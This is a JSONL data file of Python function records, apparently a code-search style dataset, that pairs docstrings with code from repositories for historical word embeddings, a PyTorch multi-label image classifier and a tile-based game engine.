{"docstring": "\"\"\"Make a line of best fit\"\"\"\n\n#Calculate trendline\n", "func_signal": "def trendline(xd, yd, order=1, c='r', alpha=1, plot_r=False, text_pos=None):\n", "code": "coeffs = np.polyfit(xd, yd, order)\n\nintercept = coeffs[-1]\nslope = coeffs[-2]\nif order == 2: power = coeffs[0]\nelse: power = 0\n\nminxd = np.min(xd)\nmaxxd = np.max(xd)\n\nxl = np.array([minxd, maxxd])\nyl = power * xl ** 2 + slope * xl + intercept\n\n#Plot trendline\nplt.plot(xl, yl, color=c, alpha=alpha)\n\n#Calculate R Squared\nr = sp.stats.pearsonr(xd, yd)[0]\n\nif plot_r == False:\n    #Plot R^2 value\n    if text_pos == None:\n        text_pos = (0.9 * maxxd + 0.1 * minxd, 0.9 * np.max(yd) + 0.1 * np.min(yd),)\n    plt.text(text_pos[0], text_pos[1], '$R = %0.2f$' % r)\nelse:\n    #Return the R^2 value:\n    return r", "path": "statutils\\plothelper.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturn the mean and stderr arrays for the values of the words specified per year in i_year_words for specified years \n\"\"\"\n", "func_signal": "def get_series_mean_std_peryear(word_time_series, i_year_words, one_minus=False, start_year=1900, end_year=2000, year_inc=1, exclude_partial_missing=False):\n", "code": "means = []\nstderrs = []\nr_word_time_series = {}\nif exclude_partial_missing:\n    for word, time_series in word_time_series.iteritems():\n        if not np.isnan(np.sum(time_series.values())):\n            r_word_time_series[word] = time_series\nelse:\n    r_word_time_series = word_time_series\nfor year in xrange(start_year, end_year + 1, year_inc):\n    word_array = np.array([r_word_time_series[word][year] for word in i_year_words[year] \n        if word in r_word_time_series and not np.isnan(r_word_time_series[word][year]) and not np.isinf(r_word_time_series[word][year])])\n    if len(word_array) == 0:\n        continue\n    if one_minus:\n        word_array = 1 - word_array\n    means.append(word_array.mean())\n    stderrs.append(word_array.std())\nreturn np.array(means), np.array(stderrs)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturn the mean and stderr arrays for the values of the words specified per year in i_year_words for specified years \n\"\"\"\n", "func_signal": "def get_series_median_peryear(word_time_series, i_year_words, one_minus=False, start_year=1900, end_year=2000, year_inc=10, exclude_partial_missing=False):\n", "code": "medians = []\nr_word_time_series = {}\nif exclude_partial_missing:\n    for word, time_series in word_time_series.iteritems():\n        if not np.isnan(np.sum(time_series.values())):\n            r_word_time_series[word] = time_series\nelse:\n    r_word_time_series = word_time_series\nfor year in xrange(start_year, end_year + 1, year_inc):\n    word_array = np.array([r_word_time_series[word][year] for word in i_year_words[year] \n        if word in r_word_time_series and not np.isnan(r_word_time_series[word][year]) and not r_word_time_series[word][year] == 0])\n    if len(word_array) == 0:\n        continue\n    if one_minus:\n        word_array = 1 - word_array\n    medians.append(np.median(word_array))\nreturn np.array(medians)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nGets subembedding.\n\"\"\"\n", "func_signal": "def get_subembed(self, word_list, normalize=False, restrict_context=True):\n", "code": "w_set = set(self.iw)\nvalid_w = [word for word in word_list if word in w_set]\nnew_w_indices = np.array([self.wi[word] for word in valid_w])\nif restrict_context:\n    c_set = set(self.ic)\n    valid_c = [word for word in word_list if word in c_set]\n    new_c_indices = np.array([self.ci[word] for word in valid_c])\n    new_m = self.m[new_w_indices, :]\n    new_m = new_m[:, new_c_indices]\nelse:\n    valid_c = self.ic\n    new_m = self.m[new_w_indices, :]\nreturn Explicit(new_m, valid_w, valid_c, normalize=normalize)", "path": "representations\\explicit.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nAssume emb1.dim == emb2.dim\n\"\"\"\n", "func_signal": "def __init__(self, emb1, emb2, normalize=False):\n", "code": "self.dim = emb1.dim\n\nvocab1 = emb1.wi.viewkeys()\nvocab2 = emb2.wi.viewkeys()\njoint_vocab = list(vocab1 & vocab2)\nonly_vocab1 = list(vocab1 - vocab2)\nonly_vocab2 = list(vocab2 - vocab1)\nself.iw = joint_vocab + only_vocab1 + only_vocab2\nself.wi = dict([(w, i) for i, w in enumerate(self.iw)])\n\nm_joint = emb1.m[[emb1.wi[w] for w in joint_vocab]] + emb2.m[[emb2.wi[w] for w in joint_vocab]]\nm_only1 = emb1.m[[emb1.wi[w] for w in only_vocab1]]\nm_only2 = emb2.m[[emb2.wi[w] for w in only_vocab2]]\nself.m = np.vstack([m_joint, m_only1, m_only2])\n\nif normalize:\n    self.normalize()", "path": "sgns\\hyperwords\\hyperwords\\representations\\embedding.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturns dictionary mapping year to:\n    \"index\": word->id index for that year.\n    \"list\": word_list for that year\n    \"indices\": set of valid indices corresponding to the word list\nAssumes that each year is indexed seperately.\n\"\"\"\n", "func_signal": "def load_year_index_infos_common(common_index, years, word_file, num_words=-1):\n", "code": "year_index_infos = collections.defaultdict(dict)\nword_lists = load_year_words(word_file, years)\nfor year, word_list in word_lists.iteritems():\n    year_index = common_index\n    year_index_infos[year][\"index\"] = year_index\n    if num_words != -1:\n        word_list = word_list[:num_words]\n    word_list, word_indices = get_word_indices(word_list, year_index)\n    year_index_infos[year][\"list\"] = word_list\n    year_index_infos[year][\"indices\"] = word_indices\nreturn year_index_infos", "path": "ioutils.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\" \n    Get the intersection of two embeddings.\n    Returns embeddings with common vocabulary and indices.\n\"\"\"\n", "func_signal": "def intersection_align(embed1, embed2, post_normalize=True):\n", "code": "common_vocab = filter(set(embed1.iw).__contains__, embed2.iw) \nnewvecs1 = np.empty((len(common_vocab), embed1.m.shape[1]))\nnewvecs2 = np.empty((len(common_vocab), embed2.m.shape[1]))\nfor i in xrange(len(common_vocab)):\n    newvecs1[i] = embed1.m[embed1.wi[common_vocab[i]]]\n    newvecs2[i] = embed2.m[embed2.wi[common_vocab[i]]]\nreturn Embedding(newvecs1, common_vocab, normalize=post_normalize), Embedding(newvecs2, common_vocab, normalize=post_normalize)", "path": "vecanalysis\\alignment.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"VGG 19-layer model (configuration 'E') with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg19_bn(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['E'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg19_bn']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"\n    write info of each objects to data.txt as predefined format\n\"\"\"\n", "func_signal": "def _WriteDataToFile(self, src_data, dst_dir):\n", "code": "if not os.path.exists(dst_dir):\n    os.mkdir(dst_dir)\nwith open(dst_dir + \"/data.txt\", 'w') as d:\n    for line in src_data:\n        d.write(json.dumps(line, separators=(',',':'))+'\\n')", "path": "data\\loader.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 16-layer model (configuration \"D\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg16_bn(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['D'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg16_bn']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"\n    create data loder\n\"\"\"\n", "func_signal": "def _DataLoader(self, dataset):\n", "code": "dataloader = DataLoader(\n    dataset,\n    batch_size=self.opt.batch_size,\n    shuffle=self.opt.shuffle,\n    num_workers=int(self.opt.load_thread), \n    pin_memory=self.opt.cuda,\n    drop_last=False)\nreturn dataloader", "path": "data\\loader.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 19-layer model (configuration \"E\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def VGG19Templet(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGGTemplet(make_layers(cfg['E'], input_channel), **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['vgg19']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"Constructs a ResNet-50 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def Resnet50Templet(input_channel, pretrained=False, **kwargs):\n", "code": "model = ResNetTemplet(Bottleneck, [3, 4, 6, 3], input_channel, **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['resnet50']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\resnet.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 11-layer model (configuration \"A\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg11(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['A'], input_channel), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg11']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 11-layer model (configuration \"A\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def VGG11BNTemplet(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGGTemplet(make_layers(cfg['A'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['vgg11_bn']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 19-layer model (configuration \"E\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg19(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['E'], input_channel), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg19']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "# parse options \n", "func_signal": "def main():\n", "code": "op = Options()\nopt = op.parse()\n\n# initialize train or test working dir\ntrainer_dir = \"trainer_\" + opt.name\nopt.model_dir = os.path.join(opt.dir, trainer_dir, \"Train\") \nopt.data_dir = os.path.join(opt.dir, trainer_dir, \"Data\") \nopt.test_dir = os.path.join(opt.dir, trainer_dir, \"Test\") \n\nif not os.path.exists(opt.data_dir):\n    os.makedirs(opt.data_dir)\nif opt.mode == \"Train\":\n    if not os.path.exists(opt.model_dir):        \n        os.makedirs(opt.model_dir)\n    log_dir = opt.model_dir \n    log_path = log_dir + \"/train.log\"\nif opt.mode == \"Test\":\n    if not os.path.exists(opt.test_dir):\n        os.makedirs(opt.test_dir)\n    log_dir = opt.test_dir\n    log_path = log_dir + \"/test.log\"\n\n# save options to disk\nutil.opt2file(opt, log_dir+\"/opt.txt\")\n\n# log setting \nlog_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'\nformatter = logging.Formatter(log_format)\nfh = logging.FileHandler(log_path, 'a')\nfh.setFormatter(formatter)\nch = logging.StreamHandler()\nch.setFormatter(formatter)\nlogging.getLogger().addHandler(fh)\nlogging.getLogger().addHandler(ch)\nlog_level = logging.INFO\nlogging.getLogger().setLevel(log_level)\n\n# load train or test data\ndata_loader = MultiLabelDataLoader(opt)\nif opt.mode == \"Train\":\n    train_set = data_loader.GetTrainSet()\n    val_set = data_loader.GetValSet()\nelif opt.mode == \"Test\":\n    test_set = data_loader.GetTestSet()\n\nnum_classes = data_loader.GetNumClasses()\nrid2name = data_loader.GetRID2Name()\nid2rid = data_loader.GetID2RID()\nopt.class_num = len(num_classes)\n\n# load model\nmodel = load_model(opt, num_classes)\n\n# define loss function\ncriterion = nn.CrossEntropyLoss(weight=opt.loss_weight) \n\n# use cuda\nif opt.cuda:\n    model = model.cuda(opt.devices[0])\n    criterion = criterion.cuda(opt.devices[0])\n    cudnn.benchmark = True\n\n# Train model\nif opt.mode == \"Train\":\n    train(model, criterion, train_set, val_set, opt, (rid2name, id2rid))\n# Test model\nelif opt.mode == \"Test\":\n    test(model, criterion, test_set, opt)", "path": "multi_label_classifier.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"Constructs a ResNet-50 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet50(pretrained=False, **kwargs):\n", "code": "model = ResNet(Bottleneck, [3, 4, 6, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet50']))\nreturn model", "path": "models\\resnet.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 13-layer model (configuration \"B\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def VGG13Templet(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGGTemplet(make_layers(cfg['B'], input_channel), **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['vgg13']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "# define web visualizer using visdom\n", "func_signal": "def train(model, criterion, train_set, val_set, opt, labels=None):\n", "code": "webvis = WebVisualizer(opt)\n\n# modify learning rate of last layer\nfinetune_params = modify_last_layer_lr(model.named_parameters(), \n                                        opt.lr, opt.lr_mult_w, opt.lr_mult_b)\n# define optimizer\noptimizer = optim.SGD(finetune_params, \n                      opt.lr, \n                      momentum=opt.momentum, \n                      weight_decay=opt.weight_decay)\n# define laerning rate scheluer\nscheduler = optim.lr_scheduler.StepLR(optimizer, \n                                      step_size=opt.lr_decay_in_epoch,\n                                      gamma=opt.gamma)\nif labels is not None:\n    rid2name, id2rid = labels\n\n# record forward and backward times \ntrain_batch_num = len(train_set)\ntotal_batch_iter = 0\nlogging.info(\"####################Train Model###################\")\nfor epoch in range(opt.sum_epoch):\n    epoch_start_t = time.time()\n    epoch_batch_iter = 0\n    logging.info('Begin of epoch %d' %(epoch))\n    for i, data in enumerate(train_set):\n        iter_start_t = time.time()\n        # train \n        inputs, targets = data\n        output, loss, loss_list = forward_batch(model, criterion, inputs, targets, opt, \"Train\")\n        optimizer.zero_grad()\n        loss.backward()\n        optimizer.step()\n       \n        webvis.reset()\n        epoch_batch_iter += 1\n        total_batch_iter += 1\n\n        # display train loss and accuracy\n        if total_batch_iter % opt.display_train_freq == 0:\n            # accuracy\n            batch_accuracy = calc_accuracy(output, targets, opt.score_thres, opt.top_k) \n            util.print_loss(loss_list, \"Train\", epoch, total_batch_iter)\n            util.print_accuracy(batch_accuracy, \"Train\", epoch, total_batch_iter)\n            if opt.display_id > 0:\n                x_axis = epoch + float(epoch_batch_iter)/train_batch_num\n                # TODO support accuracy visualization of multiple top_k\n                plot_accuracy = [batch_accuracy[i][opt.top_k[0]] for i in range(len(batch_accuracy)) ]\n                accuracy_list = [item[\"ratio\"] for item in plot_accuracy]\n                webvis.plot_points(x_axis, loss_list, \"Loss\", \"Train\")\n                webvis.plot_points(x_axis, accuracy_list, \"Accuracy\", \"Train\")\n        \n        # display train data \n        if total_batch_iter % opt.display_data_freq == 0:\n            image_list = list()\n            show_image_num = int(np.ceil(opt.display_image_ratio * inputs.size()[0]))\n            for index in range(show_image_num): \n                input_im = util.tensor2im(inputs[index], opt.mean, opt.std)\n                class_label = \"Image_\" + str(index) \n                if labels is not None:\n                    target_ids = [targets[i][index] for i in range(opt.class_num)]\n                    rids = [id2rid[j][k] for j,k in enumerate(target_ids)]\n                    class_label += \"_\"\n                    class_label += \"#\".join([rid2name[j][k] for j,k in enumerate(rids)])\n                image_list.append((class_label, input_im))\n            image_dict = OrderedDict(image_list)\n            save_result = total_batch_iter % opt.update_html_freq\n            webvis.plot_images(image_dict, opt.display_id + 2*opt.class_num, epoch, save_result)\n        \n        # validate and display validate loss and accuracy\n        if len(val_set) > 0  and total_batch_iter % opt.display_validate_freq == 0:\n            val_accuracy, val_loss = validate(model, criterion, val_set, opt)\n            x_axis = epoch + float(epoch_batch_iter)/train_batch_num\n            accuracy_list = [val_accuracy[i][opt.top_k[0]][\"ratio\"] for i in range(len(val_accuracy))]\n            util.print_loss(val_loss, \"Validate\", epoch, total_batch_iter)\n            util.print_accuracy(val_accuracy, \"Validate\", epoch, total_batch_iter)\n            if opt.display_id > 0:\n                webvis.plot_points(x_axis, val_loss, \"Loss\", \"Validate\")\n                webvis.plot_points(x_axis, accuracy_list, \"Accuracy\", \"Validate\")\n\n        # save snapshot \n        if total_batch_iter % opt.save_batch_iter_freq == 0:\n            logging.info(\"saving the latest model (epoch %d, total_batch_iter %d)\" %(epoch, total_batch_iter))\n            save_model(model, opt, epoch)\n            # TODO snapshot loss and accuracy\n        \n    logging.info('End of epoch %d / %d \\t Time Taken: %d sec' %\n          (epoch, opt.sum_epoch, time.time() - epoch_start_t))\n    \n    if epoch % opt.save_epoch_freq == 0:\n        logging.info('saving the model at the end of epoch %d, iters %d' %(epoch+1, total_batch_iter))\n        save_model(model, opt, epoch+1) \n\n    # adjust learning rate \n    scheduler.step()\n    lr = optimizer.param_groups[0]['lr'] \n    logging.info('learning rate = %.7f epoch = %d' %(lr,epoch)) \nlogging.info(\"--------Optimization Done--------\")", "path": "multi_label_classifier.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 16-layer model (configuration \"D\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def VGG16BNTemplet(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGGTemplet(make_layers(cfg['D'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['vgg16_bn']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"Constructs a ResNet-152 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet152(pretrained=False, **kwargs):\n", "code": "model = ResNet(Bottleneck, [3, 8, 36, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet152']))\nreturn model", "path": "models\\resnet.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "# parse options \n", "func_signal": "def main():\n", "code": "op = Options()\nopt = op.parse()\n\n# special setting\nopt.shuffle = False\nopt.batch_size = 1\nopt.load_thread = 1\n\n# initialize train or test working dir\ntest_dir = os.path.join(opt.classify_dir , opt.name)\nopt.model_dir = opt.dir + \"/trainer_\" + opt.name + \"/Train/\"\nif not os.path.exists(test_dir):\n    os.mkdir(test_dir)\n\n# save options to disk\nopt2file(opt, os.path.join(test_dir, \"opt.txt\"))\n\n# log setting \nlog_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'\nformatter = logging.Formatter(log_format)\nfh = logging.FileHandler(test_dir + \"/deploy.log\", 'a')\nfh.setFormatter(formatter)\nch = logging.StreamHandler()\nch.setFormatter(formatter)\nlogging.getLogger().addHandler(fh)\nlogging.getLogger().addHandler(ch)\nlogging.getLogger().setLevel(logging.INFO)\n\n# load label  \nif opt.label_file == \"\":\n    opt.label_file = opt.dir + \"/label.txt\"\nrid2name, id2rid, rid2id = load_label(opt.label_file)\nnum_classes = [len(rid2name[index])-2 for index in range(len(rid2name))]\n    \n# load transformer\ntransformer = get_transformer(opt) \n\n# load model\nmodel = load_model(opt, num_classes)\nmodel.eval()\n\n# use cuda\nif opt.cuda:\n    model = model.cuda(opt.devices[0])\n    cudnn.benchmark = True\n\nl = open(test_dir + \"/classify_res_data.txt\", 'w')\nwith open(opt.classify_dir + \"/data.txt\") as data:\n    for num, line in enumerate(data):\n        logging.info(str(num+1))\n        line = json.loads(line)\n        input_tensor = load_image(line[\"image_file\"], line[\"box\"], opt, transformer) \n        input_tensor = input_tensor.unsqueeze(0)\n        if opt.cuda:\n            input_tensor = input_tensor.cuda(opt.devices[0])\n        outputs = model(Variable(input_tensor, volatile=True)) \n        if not isinstance(outputs, list):\n            outputs = [outputs]\n        line[\"classify_res\"] = list() \n        for index, out in enumerate(outputs):\n            out = out.cpu()\n            #print \"out:\", out\n            softmax = F.softmax(out, dim=1).data.squeeze()\n            #print \"softmax:\", softmax \n            probs, ids = softmax.sort(0, True)\n            classify_res = {}\n            for i in range(len(probs)):\n                classify_res[rid2name[index][id2rid[index][ids[i]]]] = probs[i]\n            classify_res[\"max_score\"] = probs[0]\n            classify_res[\"best_label\"] = rid2name[index][id2rid[index][ids[0]]]\n            line[\"classify_res\"].append(classify_res)\n        l.write(json.dumps(line, separators=(',', ':'))+'\\n')\nl.close()\nlogging.info(\"classification done\")", "path": "deploy.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 13-layer model (configuration \"B\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg13_bn(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['B'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg13_bn']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"Constructs a ResNet-152 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def Resnet152Templet(input_channel, pretrained=False, **kwargs):\n", "code": "model = ResNetTemplet(Bottleneck, [3, 8, 36, 3], input_channel, **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['resnet152']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\resnet.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 19-layer model (configuration 'E') with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def VGG19BNTemplet(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGGTemplet(make_layers(cfg['E'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model_dict = LoadPretrainedModel(model, model_zoo.load_url(model_urls['vgg19_bn']))\n    model.load_state_dict(model_dict)\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"VGG 11-layer model (configuration \"A\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg11_bn(input_channel=3, pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['A'], input_channel, batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg11_bn']))\nreturn model", "path": "models\\vgg.py", "repo_name": "pangwong/pytorch-multi-label-classifier", "stars": 296, "license": "None", "language": "python", "size": 5484}
{"docstring": "\"\"\"An instance of :class:`constants.Direction`\n\nThis property indicates the direction the actor is facing.\nIs it possible to set this property to a new value.\n\nRaises:\n    AttributeError: If the instance has no `walkabout` property.\n    TypeError: If one tries to delete this property\n\n\"\"\"\n\n", "func_signal": "def direction(self):\n", "code": "if self.walkabout is None:\n\n    raise AttributeError(\"Actor has no 'walkabout' property\")\n\nreturn self.walkabout.direction", "path": "hypatia\\actor.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Fetch TileInfo by tile coordinate.\n\nArgs:\n  coord (tuple): (x, y) coordinate; z always just\n    z-index (it's not a pixel value)\n\nReturns:\n  TileProperties\n\nExamples:\n  >>> tiles = [[[0, 0], [0, 0]]]\n  >>> tilemap = TileMap('debug', tiles)\n  >>> 'impass_all' in tilemap[(1, 1)].flags\n  True\n\n\"\"\"\n\n", "func_signal": "def __getitem__(self, coord):\n", "code": "x, y = coord\nwidth_in_tiles = self.dimensions_in_tiles[0]\n\nreturn self.tiles[coord_to_index(width_in_tiles, x, y)]", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"\n\nArgs:\n    reason_enum (NoResponseReason): Why there's\n        no response.\n\nRaises:\n    TypeError: reason_enum is not a valid\n        NoResponseReason enumeration.\n\n\"\"\"\n", "func_signal": "def __init__(self, reason_enum):\n", "code": "super(NoActorResponse, self).__init__(reason_enum)\n\n# Check for a valid reason or fail.\nif isinstance(reason_enum, NoResponseReason):\n    self.reason = reason_enum\nelse:\n\n    raise TypeError(reason_enum)", "path": "hypatia\\actor.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Test the Tilemap class from the tiles module.\n\n\"\"\"\n\n", "func_signal": "def test_tilemap():\n", "code": "resource = resources.Resource('scenes', 'debug')\nmap_string = resource['tilemap.txt'].strip()\ntilemap = tiles.TileMap.from_string(map_string)\n\n# there are 208 impassable rects in the debug tilemap\nassert len(tilemap.impassable_rects) == 208\n\n# make sure from string/to string works reproducibly\nassert map_string == tilemap.to_string()\n\n# fetching tile info\nassert tilemap[(2, 4)] is tilemap.tilesheet[11]\nassert tilemap.get_info((2 * 10, 4 * 10)) is tilemap.tilesheet[11]\nassert tilemap.get_info((2 * 10, 4 * 10)) is tilemap[(2, 4)]", "path": "tests\\test_tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Tests the coord_to_index function from tiles.py\"\"\"\n\n# coords_to_index(row_width, x, y)\n\n#    0  1  2\n# -----------\n# 0| 00 01 02\n# 1| 03 04 05\n# 2| 06 07 08\n", "func_signal": "def test_coord_to_index():\n", "code": "assert tiles.coord_to_index(3, 2, 2) == 8\n\n#    0  1  2  3  4\n# -----------------\n# 0| 00 01 02 03 04\n# 1| 05 06 07 08 09\n# 2| 10 11 12 13 14\nassert tiles.coord_to_index(5, 4, 2) == 14", "path": "tests\\test_tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Tests Tile() from tiles.py\"\"\"\n\n# first let's be clear about our variables\n", "func_signal": "def test_tile():\n", "code": "faux_tilesheet = pygame.Surface((800, 600))\ntile_size = (10, 10)\ntilesheet_id = 16\ntile_flags = set(['impass_all'])\ntile = tiles.Tile(tilesheet_id=tilesheet_id,\n                  tilesheet_surface=faux_tilesheet,\n                  tile_size=tile_size,\n                  flags=tile_flags)\n\n# test tile\nassert tile.size == tile_size\nassert tile.tilesheet_id == tilesheet_id\nassert tile.flags == tile_flags\nassert tile.subsurface.get_rect().topleft == (0, 0)\nassert tile.area_on_tilesheet.topleft == (160, 0)", "path": "tests\\test_tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
